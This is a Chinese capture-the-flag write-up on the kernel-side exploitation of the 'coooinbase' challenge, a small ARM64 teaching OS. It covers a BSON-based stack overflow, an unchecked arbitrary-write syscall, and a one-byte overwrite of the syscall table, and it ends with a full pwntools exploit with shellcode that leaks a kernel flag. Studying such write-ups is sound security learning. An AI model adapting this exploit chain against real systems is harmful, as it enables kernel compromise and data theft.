> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.anquanke.com](https://www.anquanke.com/post/id/242627)

> 本篇文章是 coooinbase 这道题的内核态利用。作为上一篇文章 PWN 掉一款小型开源 OS——用户态利用的续篇，本文将解决上文遗留下的一些问题，并分析从 userland 到 kerneland 的利用机会。

[![](https://p3.ssl.qhimg.com/t01f4ae3bee0d8aeb12.png)](https://p3.ssl.qhimg.com/t01f4ae3bee0d8aeb12.png)

本篇文章是 coooinbase 这道题的内核态利用。作为上一篇文章`PWN掉一款小型开源OS——用户态利用`的续篇，本文将解决上文遗留下的一些问题，并分析从 userland 到 kerneland 的利用机会。

遗留下的问题
------

```
from pwn import *
import bson

context.arch = 'aarch64'

obj = {
    'CVC':111,
    'MON':1,
    'YR': 2021
}
bs = bson.dumps(obj)

bs = bs[:-1]
bs += b'\x02'
bs += b'CC'
bs += b'\x00'
bs += p32(0x10)
bs += b'A'*(0x60)
bs += b'\x00'
bs += b'\x00'

print(b64e(bs)+' ')
```

若按照上一篇文章的 bson 结构去构造 payload，即`'CVC':111`，当 payload 大于一定长度时会导致不能到达以下分支，没法触发漏洞

[![](https://p3.ssl.qhimg.com/t01dd4deab2dd1c566d.png)](https://p3.ssl.qhimg.com/t01dd4deab2dd1c566d.png)

原因是`copy_payload`的返回值不为 0

[![](https://p4.ssl.qhimg.com/t01ed8d913792129880.png)](https://p4.ssl.qhimg.com/t01ed8d913792129880.png)

让`copy_payload`执行到这个分支即可返回 0，经过测试`'CVC':545`能通过 check

[![](https://p1.ssl.qhimg.com/t013175215ea4da6dad.png)](https://p1.ssl.qhimg.com/t013175215ea4da6dad.png)

按以下方法构造 bson 序列，便能发送长字符串，并触发栈溢出

```
from pwn import *
import bson

context.arch = 'aarch64'

obj = {
    'CVC':545,
    'MON':1,
    'YR': 2021
}
bs = bson.dumps(obj)

bs = bs[:-1]
bs += b'\x02'
bs += b'CC'
bs += b'\x00'
bs += p32(0x10)
bs += b'A'*(0x60)
bs += b'\x00'
bs += b'\x00'

print(b64e(bs)+' ')
```

[![](https://p0.ssl.qhimg.com/t0187c8dc1237ca64c8.png)](https://p0.ssl.qhimg.com/t0187c8dc1237ca64c8.png)

源码审计
----

内核源码可以从[此处](https://github.com/zhulangpi/NBOS/tree/21864bddac81170159214044c3763eeb7d4a331f)下载

[![](https://p5.ssl.qhimg.com/t01237f107b45d4a645.png)](https://p5.ssl.qhimg.com/t01237f107b45d4a645.png)

下面重点来审系统调用，`include/syscall.h`实现了以下一些系统调用

[![](https://p2.ssl.qhimg.com/t015d7caf24a3b97c33.png)](https://p2.ssl.qhimg.com/t015d7caf24a3b97c33.png)

`sys_read`和`sys_write`的实现，并未对传入的`buf`地址指针做检查，也就是可以 call `sys_read`、`sys_write`在内核空间任意读写

[![](https://p3.ssl.qhimg.com/t01d79f43a30fc23b71.png)](https://p3.ssl.qhimg.com/t01d79f43a30fc23b71.png)

在`init/init_task.c`处调用户态进程

[![](https://p5.ssl.qhimg.com/t0110e621c313c89315.png)](https://p5.ssl.qhimg.com/t0110e621c313c89315.png)

通过 call `sys_execv`系统调用分配进程资源，并装载用户态进程

[![](https://p4.ssl.qhimg.com/t0154d58906b8f564db.png)](https://p4.ssl.qhimg.com/t0154d58906b8f564db.png)

静态分析
----

接下来用 IDA 打开 coooinbase.bin，Processor type 选`ARM Little-endian`，kernel 装载基址为`0xffff000000080000`

[![](https://p0.ssl.qhimg.com/t0179ec2800ac89988c.png)](https://p0.ssl.qhimg.com/t0179ec2800ac89988c.png)

查找字符串能看到 flag 所在的内核地址`0xFFFF000000088858`

[![](https://p4.ssl.qhimg.com/t015de3aacffb1a2266.png)](https://p4.ssl.qhimg.com/t015de3aacffb1a2266.png)

对照源码，在内核程序中应当有一个系统调用表

[![](https://p3.ssl.qhimg.com/t0184ef04b4892b5063.png)](https://p3.ssl.qhimg.com/t0184ef04b4892b5063.png)

在`0xFFFF000000087140`地址处找到了这个系统调用表

[![](https://p2.ssl.qhimg.com/t0160b18a90bf4cc125.png)](https://p2.ssl.qhimg.com/t0160b18a90bf4cc125.png)

`sys_read`调用，与源码没啥区别，可以对任意内核地址写入数据

[![](https://p5.ssl.qhimg.com/t01c784a7f0f52efe22.png)](https://p5.ssl.qhimg.com/t01c784a7f0f52efe22.png)

在`sys_write`调用，出题人加入了 check，会检查`addr <= 0xffff`，只能打印出用户空间的内存信息

[![](https://p1.ssl.qhimg.com/t01f1ff295d9c739ceb.png)](https://p1.ssl.qhimg.com/t01f1ff295d9c739ceb.png)

Debug
-----

`0xFFFF000000082A60`之后就是通过 check 后代码

[![](https://p3.ssl.qhimg.com/t01ad85f1e87291c451.png)](https://p3.ssl.qhimg.com/t01ad85f1e87291c451.png)

如能将系统调用表中指向`sys_write`的指针覆盖成`0xFFFF000000082A60`则能绕过 check，而且这仅需要写 1 个 byte

[![](https://p3.ssl.qhimg.com/t014f8ad5db2a0e6e32.png)](https://p3.ssl.qhimg.com/t014f8ad5db2a0e6e32.png)

后续利用过程：  
1. 调 sys_open 打开`/run`这个文件，在这个文件里找到一个`\x60`byte 对应的偏移  
2. 通过偏移 sys_lseek 到该处  
3. 调 sys_read 将该处的`\x60`写入到`0xFFFF000000087140`覆盖 sys_write ptr 的最后 1 byte  
4. 调 sys_write 将内核地址中的 flag 打印出来

打开`/run`文件

[![](https://p2.ssl.qhimg.com/t017dbb5dc932958b8f.png)](https://p2.ssl.qhimg.com/t017dbb5dc932958b8f.png)

`/run`是我们的用户态进程，装载到`0x0`的地址上，在`offset = 0x3a2`处找到了`\x60`byte。lseek 到该处，将文件指针指向这个位置。

[![](https://p1.ssl.qhimg.com/t01c45a5a598e4c3cb5.png)](https://p1.ssl.qhimg.com/t01c45a5a598e4c3cb5.png)

内核里关于 sys_lseek 实现的部分源码，`whence`需要设置成`0`，令 fd 指向一个绝对文件地址，也就是调`sys_lseek(fd, 0x3a2, 0)`

```
//syscall.c:64~74
int sys_lseek(int fd, int offset, int whence)
{
    struct file *filp;
    if( (fd>=NR_OPEN) || (fd<0))
        return -1;
    filp = current->filp[fd];
    if(filp==NULL)
        return -1;

    return file_lseek(filp, offset, whence);
}

//fs.c:363~387
int file_lseek(struct file *filp, int offset, int whence)
{
    int pos = (int)filp->f_pos;

    switch(whence){
        case SEEK_SET:
            pos = offset;
            break;
        case SEEK_CUR:
            pos += offset;
            break;
        case SEEK_END:
            pos = filp->f_inode->i_size;
            pos += offset;
            break;
        default:
            break;
    }

    if( (pos<0) || (pos>filp->f_inode->i_size) )
        return -1;

    filp->f_pos = (unsigned long)pos;
    return pos;
}

//fs.h:45~56
#define I_NEW       (8)

#define SEEK_SET    (0)
#define SEEK_CUR    (1)
#define SEEK_END    (2)

struct file{
    struct inode *f_inode;
    unsigned long f_count;
    int f_flags;
    unsigned long f_pos;
};
```

调`sys_read(fd, 0xffff000000087140, 1)`之后，系统调用表中的`sys_write ptr`便被写为`0xffff000000082a60`

[![](https://p3.ssl.qhimg.com/t0159340c32490f5dd1.png)](https://p3.ssl.qhimg.com/t0159340c32490f5dd1.png)

再调用`sys_write`便能绕过`addr <= 0xffff`的 check，打印出 flag

[![](https://p0.ssl.qhimg.com/t0129ce4566428ea007.png)](https://p0.ssl.qhimg.com/t0129ce4566428ea007.png)

Script
------

完整 EXP

```
from pwn import *
import bson

context.arch = 'aarch64'

obj = {
    'CVC': 545,
    'MON': 1,
    'YR': 2021
}
bs = bson.dumps(obj)

bs = bs[:-1]
bs += b'\x02'
bs += b'CC'
bs += b'\x00'
bs += p32(0x10)
bs += b'B'*(0x18)
bs += p64(0xfc46)#ret addr

shellcode = '''ldr x0,=0x6e75722f   // /run
mov x1, 0x0
stp x0, x1, [sp]
mov x0, sp
mov x5, 0x340        // SYS_open
blr x5

mov x4, x0           // save file descriptior
mov x1, 0x3a2        // offset of 0x60 in order to change SYS_write to after check
mov x2, 0x0
mov x5, 0x364        // SYS_lseek
blr x5

mov x0, x4                   // move saved file desc
ldr x1, =0xffff000000087140  // syscall handler for write
mov x2, 0x1                  // count
mov x5, 0x34c                // SYS_read
blr x5

ldr x0, =0xffff000000088858  // addr of the flag
mov x2, 0x36                 // count
mov x5, 0x310                // SYS_write
blr x5'''

payload = asm(shellcode)
bs += payload + b'\x00'
bs += b'\x00'

#print(hexdump(bs))
print(b64e(bs)+' ')
```